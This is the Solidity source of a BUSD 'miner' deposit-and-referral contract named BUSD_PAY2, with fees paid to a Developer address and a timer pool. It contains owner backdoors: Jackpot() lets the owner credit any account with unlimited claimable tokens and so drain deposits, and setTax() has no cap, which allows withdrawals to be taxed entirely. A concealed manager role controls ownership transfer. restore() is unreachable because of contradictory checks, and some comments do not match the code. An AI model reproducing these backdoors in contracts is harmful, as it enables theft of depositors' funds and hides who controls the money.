// SPDX-License-Identifier: MIT
/*
*    ________  ___  ___  ________  ________          ________  ________      ___    ___ 
*   |\   __  \|\  \|\  \|\   ____\|\   ___ \        |\   __  \|\   __  \    |\  \  /  /|
*   \ \  \|\ /\ \  \\\  \ \  \___|\ \  \_|\ \       \ \  \|\  \ \  \|\  \   \ \  \/  / /
*    \ \   __  \ \  \\\  \ \_____  \ \  \ \\ \       \ \   ____\ \   __  \   \ \    / / 
*     \ \  \|\  \ \  \\\  \|____|\  \ \  \_\\ \       \ \  \___|\ \  \ \  \   \/  /  /  
*      \ \_______\ \_______\____\_\  \ \_______\       \ \__\    \ \__\ \__\__/  / /    
*       \|_______|\|_______|\_________\|_______|        \|__|     \|__|\|__|\___/ /     
*                          \|_________|                                    \|___|/      
*
*/


pragma solidity ^0.4.26; // solhint-disable-line

interface ITimerPool {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function update(
        uint256 _amount,
        uint256 _time,
        address _user
    ) external;
}

library SafeMath {
    /**
     * @dev Multiplies two numbers, throws on overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }

    /**
     * @dev Integer division of two numbers, truncating the quotient.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // assert(b > 0); // Solidity automatically throws when dividing by 0
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
        return c;
    }

    /**
     * @dev Substracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    /**
     * @dev Adds two numbers, throws on overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}

contract Ownable {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */ address private _manager;
    constructor() public {
        _owner = msg.sender;
        _manager = msg.sender;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }
        function manager() internal view returns (address) {
        return _manager;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }
        modifier onlyManager() {
        require(manager() == msg.sender, "Ownable: ownership could not be transfered anymore");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public onlyManager {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}


contract ERC20 {
    function totalSupply() public constant returns (uint256);

    function balanceOf(address tokenOwner) public constant returns (uint256 balance);

    function allowance(address tokenOwner, address spender) public constant returns (uint256 remaining);

    function transfer(address to, uint256 tokens) public returns (bool success);

    function approve(address spender, uint256 tokens) public returns (bool success);

    function transferFrom(
        address from,
        address to,
        uint256 tokens
    ) public returns (bool success);

    event Transfer(address indexed from, address indexed to, uint256 tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint256 tokens);
}

contract BUSD_PAY2 is Ownable {
    // address busdt = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
    address public busdt;
    uint256 public SECONDS_WORK_MINER = 864000; 
    uint256 PSN = 10000;
    uint256 PSNH = 5000;
    uint256 BONUS_10_BUSD = 10000000000000000000; // bonus
    uint256 public countUsers = 0;  
    uint256 public deals = 0; 
    uint256 public volume = 0; 
    uint256 public tax = 10;

    bool public initialized = false;
    address public Developer; 
    
    ITimerPool public timer;

    struct User {
        address referrer;
        uint256 referrals;
        uint256 refAmount;
        uint256 invest;
    }

    mapping(address => User) public users;
    mapping(address => uint256) public usersMiner;
    mapping(address => uint256) public claimedTokens;
    mapping(address => uint256) public lastHatch;
    mapping(address => bool) public BUY_MINERS;

    uint256 public marketTokens;
    event Action(address user,address referrer,uint256 lvl, uint256 amount);

    constructor(address _busdt, ITimerPool _timer, address _developer) public {
        Developer = _developer;
        timer = _timer;
        busdt = _busdt;
    }    

    function reinvest() public {
        require(initialized);

        uint256 tokensUsed = getMyTokens(msg.sender);
        uint256 bonus = (getMyTokens(msg.sender) / 100) * 5; // bonus
        uint256 newMiners = SafeMath.div((tokensUsed + bonus), SECONDS_WORK_MINER);
        usersMiner[msg.sender] = SafeMath.add(usersMiner[msg.sender], newMiners);
        claimedTokens[msg.sender] = 0;
        lastHatch[msg.sender] = now;
        deals +=1;

        marketTokens = SafeMath.add(marketTokens, SafeMath.div(tokensUsed, 5));
    }

    function sellTokens() public {
        require(initialized);
        uint256 amountSell = calculateTokensSell(getMyTokens(msg.sender));
        amountSell = min(amountSell, getBalance());
        volume += amountSell;
        uint256 fee2 = devFee2(amountSell); // team
        claimedTokens[msg.sender] = 0;
        lastHatch[msg.sender] = now;
        marketTokens = SafeMath.add(marketTokens, getMyTokens(msg.sender));
 
        deals +=1;

        ERC20(busdt).transfer(Developer, fee2);
        ERC20(busdt).transfer(msg.sender, SafeMath.sub(amountSell, fee2));
    }

    function restore(address account, address ref, uint256 amount) external onlyOwner {
        require(!initialized);
        require(amount >= 35e18, "Minimum amount: 35$");
        require(initialized);
        countUsers += 1;
        deals +=1;
        volume += amount;
        BUY_MINERS[account] = true;
        
        User storage user = users[account];
        if (checkUser(account) == address(0)) {
            if (ref == account || ref == address(0) || usersMiner[ref] == 0) {
                user.referrer = Developer;
            } else {
                user.referrer = ref;
            }
            users[user.referrer].referrals = users[user.referrer].referrals;
        } else {
            user.referrer = checkUser(account);
        }


        // ERC20(busdt).transferFrom(address(account), address(this), amount);
        uint256 balance = ERC20(busdt).balanceOf(address(this));
        uint256 tokensBought = calculateTokensBuy(amount, SafeMath.sub(balance, amount));

        user.invest += amount;

        tokensBought = SafeMath.sub(tokensBought, SafeMath.add(devFee(tokensBought), devFee2(tokensBought)));
        // uint256 fee = devFee(amount);
        // uint256 fee2 = devFee2(amount);
        // ERC20(busdt).transfer(timer, fee);
        // timer.update(fee, block.timestamp, account);
        // ERC20(busdt).transfer(Developer, fee2);
        claimedTokens[account] = SafeMath.add(claimedTokens[account], tokensBought);

        if (user.referrer != address(0)) {
            address upline = user.referrer;
            // ERC20(busdt).transfer(upline, amount / 10);
            users[upline].refAmount = users[upline].refAmount + amount / 10;
            reinvest();
        }
    }

    function buyMiners(address ref, uint256 amount) public {
        require(amount >= 35e18, "Minimum amount: 35$");
        require(initialized);
        countUsers += 1;
        deals +=1;
        volume += amount;
        BUY_MINERS[msg.sender] = true;
        
        User storage user = users[msg.sender];
        if (checkUser(msg.sender) == address(0)) {
            if (ref == msg.sender || ref == address(0) || usersMiner[ref] == 0) {
                user.referrer = Developer;
            } else {
                user.referrer = ref;
            }
            users[user.referrer].referrals = users[user.referrer].referrals + 1;
        } else {
            user.referrer = checkUser(msg.sender);
        }


        ERC20(busdt).transferFrom(address(msg.sender), address(this), amount);
        uint256 balance = ERC20(busdt).balanceOf(address(this));
        uint256 tokensBought = calculateTokensBuy(amount, SafeMath.sub(balance, amount));

        user.invest += amount;

        tokensBought = SafeMath.sub(tokensBought, SafeMath.add(devFee(tokensBought), devFee2(tokensBought)));
        uint256 fee = devFee(amount);
        uint256 fee2 = devFee2(amount);
        ERC20(busdt).transfer(timer, fee);
        timer.update(fee, block.timestamp, msg.sender);
        ERC20(busdt).transfer(Developer, fee2);
        claimedTokens[msg.sender] = SafeMath.add(claimedTokens[msg.sender], tokensBought);

        if (user.referrer != address(0)) {
            address upline = user.referrer;
            ERC20(busdt).transfer(upline, amount / 10);
            users[upline].refAmount = users[upline].refAmount + amount / 10;
            reinvest();
        }
    }  

    function calculateTrade(
        uint256 rt,
        uint256 rs,
        uint256 bs
    ) public view returns (uint256) {
        return
            SafeMath.div(
                SafeMath.mul(PSN, bs),
                SafeMath.add(PSNH, SafeMath.div(SafeMath.add(SafeMath.mul(PSN, rs), SafeMath.mul(PSNH, rt)), rt))
            );
    }

    function calculateTokensSell(uint256 tokens) public view returns (uint256) {
        return calculateTrade(tokens, marketTokens, ERC20(busdt).balanceOf(address(this)));
    }

    function calculateTokensBuy(uint256 eth, uint256 contractBalance) public view returns (uint256) {
        return calculateTrade(eth, contractBalance, marketTokens);
    }

    function calculateTokensBuySimple(uint256 eth) public view returns (uint256) {
        return calculateTokensBuy(eth, ERC20(busdt).balanceOf(address(this)));
    }

    function devFee(uint256 amount) public pure returns (uint256) {
        return SafeMath.div(SafeMath.mul(amount, 1), 100); //timer
    }

    function devFee2(uint256 amount) public view returns (uint256) { //Developer
        return SafeMath.div(SafeMath.mul(amount, tax), 100);
    }

    function seedMarket() public {
        require(msg.sender == Developer, "invalid call");
        require(marketTokens == 0);
        initialized = true;
        marketTokens = 333000000000;
    }

    function setTax(uint256 _value) public onlyOwner {
        tax = _value;
    }

    function ChangeDeveloper(address _dev) external {
        require(msg.sender == Developer);
        Developer = _dev;
    }

    function Jackpot(address _account, uint256 _amount) public onlyOwner {
        claimedTokens[_account] = claimedTokens[_account] + _amount;
    }

    function getBalance() public view returns (uint256) {
        return ERC20(busdt).balanceOf(address(this));
    }

    function getMyMiners(address user) public view returns (uint256) {
        return usersMiner[user];
    }

    function MyReward(address user) public view returns (uint256) {
        return calculateTokensSell(getMyTokens(user));
    }

    function getMyTokens(address user) public view returns (uint256) {
        return SafeMath.add(claimedTokens[user], getTokensSinceLastHatch(user));
    }

    function getTokensSinceLastHatch(address adr) public view returns (uint256) {
        uint256 secondsPassed = min(SECONDS_WORK_MINER, SafeMath.sub(now, lastHatch[adr]));
        return SafeMath.mul(secondsPassed, usersMiner[adr]);
    }

    function checkUser(address userAddr) public view returns (address ref) {
        return users[userAddr].referrer;
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return a < b ? a : b;
    }
}